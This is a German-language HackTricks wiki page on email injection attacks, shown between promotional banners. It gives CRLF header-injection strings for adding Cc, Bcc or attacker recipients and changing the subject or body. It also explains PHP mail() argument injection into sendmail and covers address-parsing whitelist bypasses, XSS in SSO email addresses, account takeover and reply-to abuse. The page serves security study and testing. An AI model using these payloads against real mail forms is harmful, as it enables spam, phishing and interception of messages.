# E-Mail-Injektionen

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=email-injections), um einfach **Workflows zu erstellen und zu automatisieren**, die von den fortschrittlichsten Community-Tools der Welt unterst√ºtzt werden.\
Heute Zugriff erhalten:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=email-injections" %}

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.

</details>

## Injizieren Sie in gesendete E-Mail

### F√ºgen Sie Cc und Bcc nach dem Absenderargument ein
```
From:sender@domain.com%0ACc:recipient@domain.co,%0ABcc:recipient1@domain.com
```
Die Nachricht wird an die Empf√§nger- und Empf√§nger1-Konten gesendet.

### Argument einschleusen
```
From:sender@domain.com%0ATo:attacker@domain.com
```
Die Nachricht wird an den urspr√ºnglichen Empf√§nger und das Konto des Angreifers gesendet.

### Injizieren Sie das Betreffsargument
```
From:sender@domain.com%0ASubject:This is%20Fake%20Subject
```
### √Ñndern Sie den Nachrichtentext

F√ºgen Sie einen Zeilenumbruch ein und schreiben Sie Ihre Nachricht, um den Nachrichtentext zu √§ndern.
```
From:sender@domain.com%0A%0AMy%20New%20%0Fake%20Message.
```
### Ausnutzung der PHP mail() Funktion
```bash
# The function has the following definition:

php --rf mail

Function [ <internal:standard> function mail ] {
- Parameters [5] {
Parameter #0 [ <required> $to ]
Parameter #1 [ <required> $subject ]
Parameter #2 [ <required> $message ]
Parameter #3 [ <optional> $additional_headers ]
Parameter #4 [ <optional> $additional_parameters ]
}
}
```
#### Der 5. Parameter ($additional\_parameters)

Dieser Abschnitt basiert darauf, **wie man diesen Parameter missbrauchen kann, wenn ein Angreifer ihn kontrolliert**.

Dieser Parameter wird der Befehlszeile hinzugef√ºgt, die PHP verwenden wird, um das Bin√§rprogramm sendmail aufzurufen. Er wird jedoch mit der Funktion `escapeshellcmd($additional_parameters)` bereinigt.

Ein Angreifer kann in diesem Fall **zus√§tzliche Parameter f√ºr sendmail einschleusen**.

#### Unterschiede in der Implementierung von /usr/sbin/sendmail

Die **sendmail**-Schnittstelle wird von der MTA-E-Mail-Software (Sendmail, Postfix, Exim usw.) bereitgestellt, die auf dem System installiert ist. Obwohl die **grundlegende Funktionalit√§t** (wie -t -i -f Parameter) aus Gr√ºnden der Kompatibilit√§t **gleich bleibt**, variieren **andere Funktionen und Parameter** je nach installierter MTA erheblich.

Hier sind einige Beispiele f√ºr verschiedene Handbuchseiten des sendmail-Befehls/der Schnittstelle:

* Sendmail MTA: http://www.sendmail.org/\~ca/email/man/sendmail.html
* Postfix MTA: http://www.postfix.org/mailq.1.html
* Exim MTA: https://linux.die.net/man/8/eximReferences

Je nach **Herkunft des sendmail-Bin√§rprogramms** wurden verschiedene Optionen entdeckt, um sie zu missbrauchen und **Dateien auszulesen oder sogar beliebige Befehle auszuf√ºhren**. Erfahren Sie, wie dies unter [**https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html**](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html) m√∂glich ist.

## Einschleusen im E-Mail-Namen

### Ignorierte Teile einer E-Mail

Die Symbole: **+, -** und **{}** k√∂nnen in seltenen F√§llen f√ºr Markierungen verwendet und von den meisten E-Mail-Servern ignoriert werden

* Z. B. john.doe+intigriti@example.com ‚Üí john.doe@example.com

**Kommentare in Klammern ()** am Anfang oder Ende werden ebenfalls ignoriert

* Z. B. john.doe(intigriti)@example.com ‚Üí john.doe@example.com

### Whitelist-Umgehung

<figure><img src="../.gitbook/assets/image (812).png" alt="https://www.youtube.com/watch?app=desktop&#x26;v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### Anf√ºhrungszeichen

<figure><img src="../.gitbook/assets/image (626).png" alt="https://www.youtube.com/watch?app=desktop&#x26;v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### IPs

Sie k√∂nnen auch IPs als Domainnamen zwischen eckigen Klammern verwenden:

* john.doe@\[127.0.0.1]
* john.doe@\[IPv6:2001:db8::1]

### Andere Schwachstellen

![https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0](<../.gitbook/assets/image (1131).png>)

## Drittanbieter-SSO

### XSS

Einige Dienste wie **github** oder **salesforce erm√∂glichen** es Ihnen, eine **E-Mail-Adresse mit XSS-Payloads** zu erstellen. Wenn Sie diese Anbieter **verwenden k√∂nnen, um sich bei anderen Diensten anzumelden** und diese Dienste die E-Mail nicht korrekt **s√§ubern**, k√∂nnten Sie **XSS** verursachen.

### Account-√úbernahme

Wenn ein **SSO-Dienst** es Ihnen erm√∂glicht, ein Konto ohne √úberpr√ºfung der angegebenen E-Mail-Adresse zu erstellen (wie **salesforce**) und Sie dann dieses Konto verwenden k√∂nnen, um sich bei einem anderen Dienst anzumelden, der **salesforce vertraut**, k√∂nnten Sie auf jedes Konto zugreifen.\
Beachten Sie, dass salesforce angibt, ob die angegebene E-Mail-Adresse verifiziert wurde oder nicht, sodass die Anwendung diese Information ber√ºcksichtigen sollte.

## Antwort an

Sie k√∂nnen eine E-Mail senden mit _**Von: unternehmen.com**_ und _**Antworten an: angreifer.com**_ und wenn eine **automatische Antwort** gesendet wird, weil die E-Mail **von** einer **internen Adresse** gesendet wurde, k√∂nnte der **Angreifer** diese **Antwort** erhalten.

## Harter Bounce-Rate

Bestimmte Dienste wie AWS implementieren eine Schwelle, die als **Harte Bounce-Rate** bekannt ist, die in der Regel auf 10% festgelegt ist. Dies ist eine wichtige Metrik, insbesondere f√ºr E-Mail-Zustelldienste. Wenn diese Rate √ºberschritten wird, kann der Dienst, wie z. B. der E-Mail-Dienst von AWS, gesperrt oder blockiert werden.

Ein **harter Bounce** bezieht sich auf eine **E-Mail**, die an den Absender zur√ºckgesendet wurde, weil die E-Mail-Adresse des Empf√§ngers ung√ºltig oder nicht vorhanden ist. Dies kann aus verschiedenen Gr√ºnden geschehen, wie z. B. die E-Mail wurde an eine nicht existierende Adresse gesendet, an eine nicht real existierende Domain oder der Server des Empf√§ngers hat sich geweigert, die **E-Mails** anzunehmen.

Im Kontext von AWS w√ºrde eine 10%ige harte Bounce-Rate bedeuten, dass von 1000 E-Mails 100 aufgrund von Gr√ºnden wie ung√ºltigen Adressen oder Domains zur√ºckgeworfen wurden. Das Erreichen oder √úberschreiten dieser Rate kann dazu f√ºhren, dass AWS SES (Simple Email Service) Ihre E-Mail-Sendeoptionen blockiert oder aussetzt.

Es ist entscheidend, eine niedrige harte Bounce-Rate aufrechtzuerhalten, um einen unterbrechungsfreien E-Mail-Dienst sicherzustellen und den Absender-Ruf zu wahren. Die √úberwachung und Verwaltung der Qualit√§t der E-Mail-Adressen in Ihren Mailinglisten kann erheblich dazu beitragen, dieses Ziel zu erreichen.

F√ºr weitere detaillierte Informationen kann die offizielle Dokumentation von AWS zur Behandlung von Bounces und Beschwerden unter [AWS SES Bounce Handling](https://docs.aws.amazon.com/ses/latest/DeveloperGuide/notification-contents.html#bounce-types) konsultiert werden.

## Referenzen

* [https://resources.infosecinstitute.com/email-injection/](https://resources.infosecinstitute.com/email-injection/)
* [https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)
* [https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view](https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view)
* [https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0](https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=email-injections), um mithilfe der weltweit **fortschrittlichsten Community-Tools** einfach **Workflows zu erstellen und zu automatisieren**.\
Erhalten Sie noch heute Zugriff:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=email-injections" %}
